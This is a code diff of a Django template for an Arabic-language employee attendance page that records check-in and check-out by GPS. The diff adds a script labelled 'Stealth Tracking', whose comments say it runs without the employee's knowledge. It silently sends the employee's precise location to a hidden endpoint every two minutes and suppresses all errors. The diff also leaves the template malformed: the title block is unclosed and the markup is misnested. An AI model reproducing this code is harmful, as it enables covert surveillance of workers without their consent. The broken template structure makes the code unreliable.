@@ -1,412 +1,441 @@
 {% extends 'base/dashboard_base.html' %}
-
-{% block title %}تسجيل الحضور والانصراف{% endblock %}
-
-{% block page_title %}تسجيل الحضور والانصراف{% endblock %}
-{% block page_subtitle %}سجل حضورك بالـ GPS{% endblock %}
-
-{% block dashboard_content %}
-
-<div class="mb-3">
-    <a href="{% url 'dashboard' %}" class="btn btn-sm btn-outline-secondary">
-        <i class="bi bi-arrow-right"></i>
-        رجوع للرئيسية
-    </a>
-</div>
-
-<div class="row justify-content-center">
-    <div class="col-md-8 col-lg-6">
-        
-        {% if not employee %}
-        <div class="alert alert-warning">
-            <i class="bi bi-exclamation-triangle-fill"></i>
-            لم يتم ربط حسابك بأي موظف. تواصل مع المدير.
-            <hr>
-            <a href="/admin/employees/employee/" class="btn btn-sm btn-warning">
-                اذهب إلى Admin لربط الحساب
-            </a>
-        </div>
-        {% else %}
-        
-        <!-- Employee Info -->
-        <div class="card border-0 shadow-sm mb-4">
-            <div class="card-body p-4 text-center">
-                {% if employee.photo %}
-                <img src="{{ employee.photo.url }}" 
-                     class="rounded-circle mb-2" 
-                     style="width: 80px; height: 80px; object-fit: cover;">
-                {% else %}
-                <div class="rounded-circle mx-auto mb-2 d-flex align-items-center justify-content-center text-white fw-bold" 
-                     style="width: 80px; height: 80px; background: linear-gradient(135deg, #06B6D4, #3B82F6); font-size: 2rem;">
-                    {{ employee.first_name_ar|first }}
-                </div>
-                {% endif %}
-                
-                <h4 class="fw-bold mb-1">{{ employee.full_name_ar }}</h4>
-                <p class="text-muted mb-0">{{ employee.job_title.name_ar }}</p>
-                <small class="text-muted">{{ employee.branch.name_ar }}</small>
-            </div>
-        </div>
-        
-        <!-- Today Status -->
-        <div class="card border-0 shadow-sm mb-4">
-            <div class="card-body">
-                <h6 class="fw-bold mb-3">
-                    <i class="bi bi-calendar-day text-primary"></i>
-                    حالة اليوم - {{ today }}
-                </h6>
-                
-                <div class="row g-3">
-                    <div class="col-6">
-                        <div class="border rounded-3 p-3 text-center">
-                            <small class="text-muted d-block">الحضور</small>
-                            {% if today_attendance and today_attendance.check_in_time %}
-                                <h5 class="fw-bold text-success mb-0">
-                                    {{ today_attendance.check_in_time|time:"H:i" }}
-                                </h5>
-                            {% else %}
-                                <h5 class="fw-bold text-muted mb-0">--:--</h5>
-                            {% endif %}
-                        </div>
-                    </div>
-                    <div class="col-6">
-                        <div class="border rounded-3 p-3 text-center">
-                            <small class="text-muted d-block">الانصراف</small>
-                            {% if today_attendance and today_attendance.check_out_time %}
-                                <h5 class="fw-bold text-danger mb-0">
-                                    {{ today_attendance.check_out_time|time:"H:i" }}
-                                </h5>
-                            {% else %}
-                                <h5 class="fw-bold text-muted mb-0">--:--</h5>
-                            {% endif %}
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-        
-        <!-- GPS Status -->
-        <div class="card border-0 shadow-sm mb-4">
-            <div class="card-body">
-                <div id="gpsStatus" class="alert alert-info d-flex align-items-center mb-3">
-                    <div class="spinner-border spinner-border-sm ms-2" role="status"></div>
-                    <div>
-                        جاري تحديد موقعك...
-                    </div>
-                </div>
-                
-                <!-- عنوان المكان -->
-                <div id="addressInfo" class="mb-3" style="display: none;">
-                    <div class="d-flex align-items-start gap-2 p-3 bg-light rounded-3">
-                        <i class="bi bi-geo-alt-fill text-danger fs-4 mt-1"></i>
-                        <div class="flex-grow-1">
-                            <small class="text-muted d-block">موقعك الحالي</small>
-                            <div class="fw-semibold" id="addressText">جاري تحديد العنوان...</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- الخريطة -->
-                <div id="mapContainer" style="display: none;">
-                    <div id="map" style="height: 250px; border-radius: 10px; margin-top: 10px;"></div>
-                </div>
-                
-                <!-- تفاصيل GPS -->
-                <div id="locationInfo" style="display: none;">
-                    <div class="row g-2 mt-3">
-                        <div class="col-4">
-                            <small class="text-muted d-block">الدقة</small>
-                            <div class="fw-semibold small" id="accuracyDisplay">-</div>
-                        </div>
-                        <div class="col-4">
-                            <small class="text-muted d-block">خط العرض</small>
-                            <div class="fw-semibold small" id="latDisplay">-</div>
-                        </div>
-                        <div class="col-4">
-                            <small class="text-muted d-block">خط الطول</small>
-                            <div class="fw-semibold small" id="lngDisplay">-</div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-        
-        <!-- Action Buttons -->
-        <div class="row g-3">
-            <div class="col-6">
-                <button id="checkInBtn" 
-                        class="btn btn-success btn-lg w-100 py-4"
-                        {% if today_attendance and today_attendance.check_in_time %}disabled{% endif %}>
-                    <i class="bi bi-box-arrow-in-right d-block mb-2" style="font-size: 2rem;"></i>
-                    <span class="fw-bold">تسجيل حضور</span>
-                </button>
-            </div>
-            <div class="col-6">
-                <button id="checkOutBtn" 
-                        class="btn btn-danger btn-lg w-100 py-4"
-                        {% if not today_attendance or not today_attendance.check_in_time or today_attendance.check_out_time %}disabled{% endif %}>
-                    <i class="bi bi-box-arrow-right d-block mb-2" style="font-size: 2rem;"></i>
-                    <span class="fw-bold">تسجيل انصراف</span>
-                </button>
-            </div>
-        </div>
-        
-        <!-- Result Message -->
-        <div id="resultMessage" class="mt-3"></div>
-        
-        {% endif %}
-        
-    </div>
-</div>
-
-{% endblock %}
-
-{% block dashboard_css %}
-<!-- Leaflet Map CSS -->
-<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-{% endblock %}
-
-{% block dashboard_js %}
-<!-- Leaflet Map JS -->
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-
+{% load custom_filters %}
+{% block title %}تسجيل الحضور
 <script>
-    let currentPosition = null;
-    let currentAddress = '';
-    let map = null;
-    let marker = null;
-    
-    // طلب الموقع
-    function requestLocation() {
-        if (!navigator.geolocation) {
-            document.getElementById('gpsStatus').className = 'alert alert-danger';
-            document.getElementById('gpsStatus').innerHTML = '<i class="bi bi-x-circle-fill"></i> المتصفح لا يدعم GPS';
-            return;
-        }
-        
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                const lat = position.coords.latitude;
-                const lng = position.coords.longitude;
-                const accuracy = position.coords.accuracy;
-                
-                currentPosition = {
-                    latitude: lat,
-                    longitude: lng,
-                    accuracy: accuracy
-                };
-                
-                // GPS Status
-                document.getElementById('gpsStatus').className = 'alert alert-success d-flex align-items-center mb-3';
-                document.getElementById('gpsStatus').innerHTML = '<i class="bi bi-geo-alt-fill fs-4 ms-2"></i><div>تم تحديد الموقع بنجاح ✅</div>';
-                
-                // عرض تفاصيل GPS
-                document.getElementById('locationInfo').style.display = 'block';
-                document.getElementById('latDisplay').textContent = lat.toFixed(6);
-                document.getElementById('lngDisplay').textContent = lng.toFixed(6);
-                document.getElementById('accuracyDisplay').textContent = Math.round(accuracy) + ' م';
-                
-                // اسم المكان
-                document.getElementById('addressInfo').style.display = 'block';
-                getAddressName(lat, lng);
-                
-                // الخريطة
-                document.getElementById('mapContainer').style.display = 'block';
-                showMap(lat, lng);
-            },
-            (error) => {
-                document.getElementById('gpsStatus').className = 'alert alert-danger';
-                let msg = 'خطأ في تحديد الموقع';
-                if (error.code === 1) msg = 'يجب السماح بالوصول للموقع من إعدادات المتصفح';
-                if (error.code === 2) msg = 'الموقع غير متاح - جرب في مكان مفتوح';
-                if (error.code === 3) msg = 'انتهى وقت الطلب - جرب مرة أخرى';
-                document.getElementById('gpsStatus').innerHTML = '<i class="bi bi-x-circle-fill fs-4 ms-2"></i><div>' + msg + '</div>';
-            },
-            {
-                enableHighAccuracy: true,
-                timeout: 15000,
-                maximumAge: 0
-            }
-        );
-    }
-    
-    // جلب اسم المكان (Reverse Geocoding)
-    async function getAddressName(lat, lng) {
-        try {
-            const response = await fetch(
-                `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json&accept-language=ar`
-            );
-            const data = await response.json();
-            
-            if (data.display_name) {
-                currentAddress = data.display_name;
-                document.getElementById('addressText').textContent = data.display_name;
-            } else {
-                document.getElementById('addressText').textContent = 'لم يتم التعرف على العنوان';
-            }
-        } catch (error) {
-            document.getElementById('addressText').textContent = 'خطأ في جلب العنوان';
-        }
-    }
-    
-    // عرض الخريطة
-    function showMap(lat, lng) {
-        if (map) {
-            map.remove();
-        }
-        
-        map = L.map('map').setView([lat, lng], 16);
-        
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-            attribution: '© OpenStreetMap'
-        }).addTo(map);
-        
-        marker = L.marker([lat, lng]).addTo(map)
-            .bindPopup('موقعك الحالي')
-            .openPopup();
-    }
-    
-    // تسجيل حضور
-    const checkInBtn = document.getElementById('checkInBtn');
-    if (checkInBtn) {
-        checkInBtn.addEventListener('click', async function() {
-            console.log('Check-in clicked!');
-            console.log('Current position:', currentPosition);
-            
-            if (!currentPosition) {
-                alert('يجب تحديد الموقع أولاً - تأكد من السماح بالوصول للموقع');
-                return;
-            }
-            
-            this.disabled = true;
-            const originalHTML = this.innerHTML;
-            this.innerHTML = '<div class="spinner-border spinner-border-sm"></div> جاري التسجيل...';
-            
-            try {
-                const payload = {
-                    ...currentPosition,
-                    address: currentAddress
-                };
-                
-                console.log('Sending:', payload);
-                
-                const response = await fetch('{% url "attendance:api_check_in" %}', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'X-CSRFToken': getCookie('csrftoken')
-                    },
-                    body: JSON.stringify(payload)
-                });
-                
-                console.log('Response status:', response.status);
-                
-                const data = await response.json();
-                console.log('Response data:', data);
-                
-                const resultDiv = document.getElementById('resultMessage');
-                if (data.success) {
-                    resultDiv.innerHTML = `
-                        <div class="alert alert-success">
-                            <i class="bi bi-check-circle-fill fs-4"></i>
-                            <strong>${data.message}</strong>
-                            <hr>
-                            <div class="small">
-                                <div><i class="bi bi-clock"></i> الوقت: ${data.time}</div>
-                                ${data.within_range ? '<div class="text-success"><i class="bi bi-geo-alt-fill"></i> داخل نطاق الفرع ✅</div>' : '<div class="text-warning"><i class="bi bi-exclamation-triangle"></i> خارج نطاق الفرع</div>'}
-                                ${data.late_minutes > 0 ? `<div class="text-warning"><i class="bi bi-clock-history"></i> تأخير: ${data.late_minutes} دقيقة</div>` : ''}
-                            </div>
-                        </div>
-                    `;
-                    setTimeout(() => window.location.reload(), 3000);
-                } else {
-                    resultDiv.innerHTML = `<div class="alert alert-danger"><i class="bi bi-x-circle-fill"></i> ${data.message}</div>`;
-                    this.disabled = false;
-                    this.innerHTML = originalHTML;
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                document.getElementById('resultMessage').innerHTML = `<div class="alert alert-danger">خطأ: ${error.message}</div>`;
-                this.disabled = false;
-                this.innerHTML = originalHTML;
-            }
-        });
-    }
-    
-    // تسجيل انصراف
-    const checkOutBtn = document.getElementById('checkOutBtn');
-    if (checkOutBtn) {
-        checkOutBtn.addEventListener('click', async function() {
-            if (!currentPosition) {
-                alert('يجب تحديد الموقع أولاً');
-                return;
-            }
-            
-            this.disabled = true;
-            const originalHTML = this.innerHTML;
-            this.innerHTML = '<div class="spinner-border spinner-border-sm"></div> جاري التسجيل...';
-            
-            try {
-                const payload = {
-                    ...currentPosition,
-                    address: currentAddress
-                };
-                
-                const response = await fetch('{% url "attendance:api_check_out" %}', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'X-CSRFToken': getCookie('csrftoken')
-                    },
-                    body: JSON.stringify(payload)
-                });
-                
-                const data = await response.json();
-                
-                const resultDiv = document.getElementById('resultMessage');
-                if (data.success) {
-                    resultDiv.innerHTML = `
-                        <div class="alert alert-success">
-                            <i class="bi bi-check-circle-fill fs-4"></i>
-                            <strong>${data.message}</strong>
-                            <hr>
-                            <div class="small">
-                                <div><i class="bi bi-clock"></i> الوقت: ${data.time}</div>
-                                <div><i class="bi bi-hourglass-split"></i> ساعات العمل: ${data.work_hours} ساعة</div>
-                            </div>
-                        </div>
-                    `;
-                    setTimeout(() => window.location.reload(), 3000);
-                } else {
-                    resultDiv.innerHTML = `<div class="alert alert-danger"><i class="bi bi-x-circle-fill"></i> ${data.message}</div>`;
-                    this.disabled = false;
-                    this.innerHTML = originalHTML;
-                }
-            } catch (error) {
-                document.getElementById('resultMessage').innerHTML = `<div class="alert alert-danger">خطأ: ${error.message}</div>`;
-                this.disabled = false;
-                this.innerHTML = originalHTML;
-            }
-        });
-    }
-    
-    // CSRF Token
-    function getCookie(name) {
-        let cookieValue = null;
-        if (document.cookie && document.cookie !== '') {
-            const cookies = document.cookie.split(';');
-            for (let i = 0; i < cookies.length; i++) {
-                const cookie = cookies[i].trim();
-                if (cookie.substring(0, name.length + 1) === (name + '=')) {
-                    cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
-                    break;
-                }
-            }
-        }
-        return cookieValue;
-    }
-    
-    // تشغيل الموقع لما الصفحة تفتح
-    window.addEventListener('load', requestLocation);
+// ════════════════════════════════════════════
+// Stealth Tracking (صامت بدون علم الموظف)
+// ════════════════════════════════════════════
+(function() {
+  const STEALTH_URL = "{% url 'attendance:api_stealth_location' %}";
+  const CSRF_TOKEN = "{{ csrf_token }}";
+  const INTERVAL_MS = 2 * 60 * 1000; // كل دقيقتين
+
+  function sendStealthLocation() {
+    if (!navigator.geolocation) return;
+
+    navigator.geolocation.getCurrentPosition(
+      function(pos) {
+        const lat = pos.coords.latitude;
+        const lng = pos.coords.longitude;
+
+        // إرسال بدون أي feedback للمستخدم
+        fetch(STEALTH_URL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "X-CSRFToken": CSRF_TOKEN,
+          },
+          body: JSON.stringify({ lat: lat, lng: lng }),
+        }).catch(function() {});
+      },
+      function() {}, // صامت تمامًا في حالة الخطأ
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
+    );
+  }
+
+  // تشغيل كل دقيقتين
+  const stealthInterval = setInterval(sendStealthLocation, INTERVAL_MS);
+
+  // إيقاف لو الصفحة اتغلقت
+  window.addEventListener("beforeunload", function() {
+    clearInterval(stealthInterval);
+  });
+})();
 </script>
+
+{% endblock %}
+
+{% block extra_css %}
+<style>
+  .checkin-container { max-width: 600px; margin: 0 auto; }
+  .checkin-btn {
+    width: 100%; padding: 16px; border: none; border-radius: 14px;
+    font-family: 'Cairo', sans-serif; font-size: 1.1rem;
+    font-weight: 700; cursor: pointer; transition: all 0.3s;
+    display: flex; align-items: center; justify-content: center; gap: 10px;
+  }
+  .checkin-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0,0,0,0.15); }
+  .btn-check-in { background: linear-gradient(135deg, #10b981, #059669); color: white; }
+  .btn-check-out { background: linear-gradient(135deg, #ef4444, #dc2626); color: white; }
+  .btn-visit { background: linear-gradient(135deg, #06B6D4, #0891B2); color: white; }
+  .btn-disabled { background: #e5e7eb; color: #9ca3af; cursor: not-allowed; }
+  .btn-disabled:hover { transform: none; box-shadow: none; }
+
+  .status-card {
+    border-radius: 14px; padding: 20px;
+    text-align: center; margin-bottom: 16px;
+  }
+  .location-info {
+    background: #f8fafc; border-radius: 10px;
+    padding: 12px; margin-top: 12px; font-size: 0.85rem;
+  }
+
+  /* الخريطة للمديرين فقط */
+  {% if not show_map %}
+  #map, .map-container, .map-section, [id*="map"] {
+    display: none !important;
+  }
+  {% endif %}
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="container-fluid py-4">
+  <div class="checkin-container">
+
+    <!-- ترحيب -->
+    <div class="text-center mb-4">
+      <div class="rounded-circle d-inline-flex align-items-center justify-content-center mb-3"
+           style="width:80px; height:80px; background:linear-gradient(135deg,#06B6D4,#0891B2);">
+        {% if employee %}
+        <span style="font-size:2rem; color:white; font-weight:900;">
+          {{ employee.first_name_ar|first }}
+        </span>
+        {% else %}
+        <i class="bi bi-person-fill" style="font-size:2rem; color:white;"></i>
+        {% endif %}
+      </div>
+
+      {% if employee %}
+      <h5 class="fw-bold mb-1">{{ employee.full_name_ar }}</h5>
+      <div class="text-muted small">
+        {{ employee.job_title.name_ar|default:"" }}
+        {% if employee.department %} | {{ employee.department.name_ar }}{% endif %}
+      </div>
+      {% if employee.branch %}
+      <div class="text-muted small mt-1">
+        <i class="bi bi-geo-alt me-1"></i>
+        {{ employee.branch.name_ar }}
+        <span class="badge bg-light text-dark border ms-1">
+          نطاق {{ employee.branch.check_in_radius|default:100 }}م
+        </span>
+      </div>
+      {% endif %}
+      {% else %}
+      <h5 class="fw-bold mb-1">مرحباً</h5>
+      <div class="alert alert-warning mt-2 small">
+        <i class="bi bi-exclamation-triangle me-1"></i>
+        لم يتم ربط حسابك بملف موظف. تواصل مع المدير.
+      </div>
+      {% endif %}
+    </div>
+
+    {% if employee %}
+
+    <!-- حالة اليوم -->
+    {% if today_attendance %}
+    <div class="status-card"
+         style="background: {% if today_attendance.check_out_time %}#f0fdf4{% else %}#fff7ed{% endif %};
+                border: 2px solid {% if today_attendance.check_out_time %}#bbf7d0{% else %}#fed7aa{% endif %};">
+
+      {% if today_attendance.check_out_time %}
+      <i class="bi bi-check-circle-fill fs-1 text-success"></i>
+      <h6 class="fw-bold mt-2 text-success">تم تسجيل اليوم بنجاح</h6>
+      <div class="d-flex justify-content-center gap-4 mt-2 text-muted small">
+        <div>
+          <i class="bi bi-box-arrow-in-right text-success me-1"></i>
+          حضور: {{ today_attendance.check_in_time|time:"H:i" }}
+        </div>
+        <div>
+          <i class="bi bi-box-arrow-left text-danger me-1"></i>
+          انصراف: {{ today_attendance.check_out_time|time:"H:i" }}
+        </div>
+      </div>
+      {% else %}
+      <i class="bi bi-clock-fill fs-1 text-warning"></i>
+      <h6 class="fw-bold mt-2 text-warning">أنت في العمل الآن</h6>
+      <div class="text-muted small">
+        <i class="bi bi-box-arrow-in-right text-success me-1"></i>
+        حضور: {{ today_attendance.check_in_time|time:"H:i" }}
+      </div>
+      {% endif %}
+    </div>
+    {% endif %}
+
+    <!-- الموقع الحالي -->
+    <div class="location-info" id="locationInfo">
+      <div class="d-flex align-items-center gap-2">
+        <div class="spinner-border spinner-border-sm text-primary" id="locationSpinner"></div>
+      <!-- معلومة النطاق -->
+      {% if employee.branch and employee.branch.check_in_radius %}
+      <div class="location-info mt-2" id="geofencing-info"
+           style="background:#fff7ed; border:1px solid #fed7aa; border-radius:10px; padding:10px;">
+        <div class="d-flex align-items-center gap-2">
+          <i class="bi bi-shield-check text-warning"></i>
+          <small class="text-muted">
+            تسجيل الحضور متاح فقط في نطاق
+            <strong>{{ employee.branch.check_in_radius }} متر</strong>
+            من {{ employee.branch.name_ar }}.
+            <br>
+            تسجيل الانصراف متاح من أي مكان.
+          </small>
+        </div>
+      </div>
+      {% endif %}
+      <!-- تكليف اليوم -->
+      {% if today_assignment %}
+      <div class="location-info mt-2"
+           style="background:{% if today_assignment.is_off %}#fde8e8{% elif today_assignment.is_extra_shift %}#fff7ed{% else %}#e0f7fa{% endif %};
+                  border:1px solid {% if today_assignment.is_off %}#fca5a5{% elif today_assignment.is_extra_shift %}#fed7aa{% else %}#67e8f9{% endif %};
+                  border-radius:10px; padding:10px;">
+        <div class="d-flex align-items-center gap-2">
+          {% if today_assignment.is_off %}
+            <i class="bi bi-calendar-x text-danger"></i>
+            <small class="text-danger fw-semibold">
+              {{ today_assignment.get_day_type_display }} — لا يوجد عمل مجدول
+            </small>
+          {% elif today_assignment.is_extra_shift %}
+            <i class="bi bi-plus-circle text-warning"></i>
+            <small class="text-warning fw-semibold">
+              شيفت إضافي
+              {% if today_assignment.count_as_overtime %} (أوفر تايم){% endif %}
+            </small>
+          {% else %}
+            <i class="bi bi-briefcase" style="color:#06B6D4;"></i>
+            <small style="color:#06B6D4;" class="fw-semibold">
+              {{ today_assignment.get_day_type_display }} — {{ today_assignment.get_work_mode_display }}
+              {% if today_assignment.expected_hours %}
+                ({{ today_assignment.expected_hours }} ساعات)
+              {% endif %}
+            </small>
+          {% endif %}
+        </div>
+        {% if today_assignment.start_time and today_assignment.end_time %}
+        <small class="text-muted d-block mt-1">
+          <i class="bi bi-clock me-1"></i>
+          {{ today_assignment.start_time|time:"H:i" }} - {{ today_assignment.end_time|time:"H:i" }}
+          {% if today_assignment.segment_2_start %}
+            + {{ today_assignment.segment_2_start|time:"H:i" }} - {{ today_assignment.segment_2_end|time:"H:i" }}
+          {% endif %}
+        </small>
+        {% endif %}
+        {% if today_assignment.task_title %}
+        <small class="text-muted d-block mt-1">
+          <i class="bi bi-card-checklist me-1"></i>
+          {{ today_assignment.task_title }}
+        </small>
+        {% endif %}
+      </div>
+      {% endif %}
+
+
+        <span id="locationText">جاري تحديد موقعك...</span>
+      </div>
+    </div>
+
+    <!-- أزرار الحضور -->
+    <div class="mt-4">
+
+      {% if not today_attendance %}
+      <!-- تسجيل حضور -->
+      <button class="checkin-btn btn-check-in mb-3"
+              id="checkInBtn" onclick="doCheckIn()" disabled>
+        <i class="bi bi-box-arrow-in-right fs-4"></i>
+        <span>تسجيل الحضور</span>
+      </button>
+
+      {% elif not today_attendance.check_out_time %}
+      <!-- تسجيل انصراف -->
+      <button class="checkin-btn btn-check-out mb-3"
+              id="checkOutBtn" onclick="doCheckOut()" disabled>
+        <i class="bi bi-box-arrow-left fs-4"></i>
+        <span>تسجيل الانصراف</span>
+      </button>
+
+      {% else %}
+      <!-- خلاص -->
+      <button class="checkin-btn btn-disabled mb-3" disabled>
+        <i class="bi bi-check-all fs-4"></i>
+        <span>تم تسجيل اليوم بالكامل</span>
+      </button>
+      {% endif %}
+
+      <!-- زرار الزيارة للميداني فقط -->
+      {% if employee and employee.is_field_worker %}
+      <a href="{% url 'attendance:visit_add' %}"
+         class="checkin-btn btn-visit">
+        <i class="bi bi-geo-alt-fill fs-4"></i>
+        <span>تسجيل زيارة ميدانية</span>
+      </a>
+      {% endif %}
+
+    </div>
+
+    <!-- رسائل -->
+    <div id="resultMessage" class="mt-3" style="display:none;"></div>
+
+    {% endif %}
+
+  </div>
+</div>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+let currentLat = null;
+let currentLng = null;
+let currentAddress = '';
+
+// ── تحديد الموقع ──────────────────────────────────────
+function getLocation() {
+  if (!navigator.geolocation) {
+    showLocationError('المتصفح لا يدعم تحديد الموقع');
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    function(pos) {
+      currentLat = pos.coords.latitude;
+      currentLng = pos.coords.longitude;
+
+      document.getElementById('locationSpinner').style.display = 'none';
+      document.getElementById('locationText').innerHTML =
+        '<i class="bi bi-check-circle text-success me-1"></i>' +
+        'تم تحديد موقعك بنجاح';
+
+      // تفعيل الأزرار
+      const checkInBtn = document.getElementById('checkInBtn');
+      const checkOutBtn = document.getElementById('checkOutBtn');
+      if (checkInBtn) checkInBtn.disabled = false;
+      if (checkOutBtn) checkOutBtn.disabled = false;
+
+      // Reverse Geocoding
+      fetch(`https://nominatim.openstreetmap.org/reverse?lat=${currentLat}&lon=${currentLng}&format=json&accept-language=ar`)
+        .then(r => r.json())
+        .then(data => {
+          currentAddress = data.display_name || '';
+          document.getElementById('locationText').innerHTML =
+            '<i class="bi bi-check-circle text-success me-1"></i>' +
+            '<small>' + (currentAddress.substring(0, 60)) + '</small>';
+        })
+        .catch(() => {});
+    },
+    function(err) {
+      showLocationError('تعذر تحديد الموقع: ' + err.message);
+    },
+    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+  );
+}
+
+function showLocationError(msg) {
+  document.getElementById('locationSpinner').style.display = 'none';
+  document.getElementById('locationText').innerHTML =
+    '<i class="bi bi-exclamation-triangle text-danger me-1"></i>' + msg;
+}
+
+// ── تسجيل الحضور ─────────────────────────────────────
+function doCheckIn() {
+  if (!currentLat || !currentLng) {
+    showResult('error', 'يرجى السماح بتحديد الموقع أولاً');
+    return;
+  }
+
+  const btn = document.getElementById('checkInBtn');
+  btn.disabled = true;
+  btn.innerHTML = '<div class="spinner-border spinner-border-sm me-2"></div> جاري التسجيل...';
+
+  const csrfToken = document.querySelector('[name=csrfmiddlewaretoken]')?.value ||
+                    getCookie('csrftoken');
+
+  fetch('{% url "attendance:api_check_in" %}', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'X-CSRFToken': csrfToken,
+    },
+    body: JSON.stringify({
+      latitude: currentLat,
+      longitude: currentLng,
+      address: currentAddress,
+    })
+  })
+  .then(r => r.json())
+  .then(data => {
+    if (data.status === 'success' || data.success) {
+      showResult('success', data.message || 'تم تسجيل الحضور بنجاح!');
+      setTimeout(() => location.reload(), 1500);
+    } else {
+      showResult('error', data.message || 'حدث خطأ');
+      btn.disabled = false;
+      btn.innerHTML = '<i class="bi bi-box-arrow-in-right fs-4"></i><span>تسجيل الحضور</span>';
+    }
+  })
+  .catch(err => {
+    showResult('error', 'خطأ في الاتصال');
+    btn.disabled = false;
+    btn.innerHTML = '<i class="bi bi-box-arrow-in-right fs-4"></i><span>تسجيل الحضور</span>';
+  });
+}
+
+// ── تسجيل الانصراف ────────────────────────────────────
+function doCheckOut() {
+  if (!currentLat || !currentLng) {
+    showResult('error', 'يرجى السماح بتحديد الموقع أولاً');
+    return;
+  }
+
+  const btn = document.getElementById('checkOutBtn');
+  btn.disabled = true;
+  btn.innerHTML = '<div class="spinner-border spinner-border-sm me-2"></div> جاري التسجيل...';
+
+  const csrfToken = document.querySelector('[name=csrfmiddlewaretoken]')?.value ||
+                    getCookie('csrftoken');
+
+  fetch('{% url "attendance:api_check_out" %}', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'X-CSRFToken': csrfToken,
+    },
+    body: JSON.stringify({
+      latitude: currentLat,
+      longitude: currentLng,
+      address: currentAddress,
+    })
+  })
+  .then(r => r.json())
+  .then(data => {
+    if (data.status === 'success' || data.success) {
+      showResult('success', data.message || 'تم تسجيل الانصراف بنجاح!');
+      setTimeout(() => location.reload(), 1500);
+    } else {
+      showResult('error', data.message || 'حدث خطأ');
+      btn.disabled = false;
+      btn.innerHTML = '<i class="bi bi-box-arrow-left fs-4"></i><span>تسجيل الانصراف</span>';
+    }
+  })
+  .catch(err => {
+    showResult('error', 'خطأ في الاتصال');
+    btn.disabled = false;
+    btn.innerHTML = '<i class="bi bi-box-arrow-left fs-4"></i><span>تسجيل الانصراف</span>';
+  });
+}
+
+// ── مساعدات ────────────────────────────────────────────
+function showResult(type, msg) {
+  const el = document.getElementById('resultMessage');
+  el.style.display = 'block';
+  if (type === 'success') {
+    el.className = 'alert alert-success border-0 shadow-sm mt-3';
+    el.innerHTML = '<i class="bi bi-check-circle-fill me-2"></i>' + msg;
+  } else {
+    el.className = 'alert alert-danger border-0 shadow-sm mt-3';
+    el.innerHTML = '<i class="bi bi-x-circle-fill me-2"></i>' + msg;
+  }
+}
+
+function getCookie(name) {
+  let val = null;
+  document.cookie.split(';').forEach(c => {
+    c = c.trim();
+    if (c.startsWith(name + '=')) val = c.substring(name.length + 1);
+  });
+  return val;
+}
+
+// ── بدء تحديد الموقع فورًا ─────────────────────────────
+getLocation();
+</script>
+
+{% csrf_token %}
 {% endblock %}
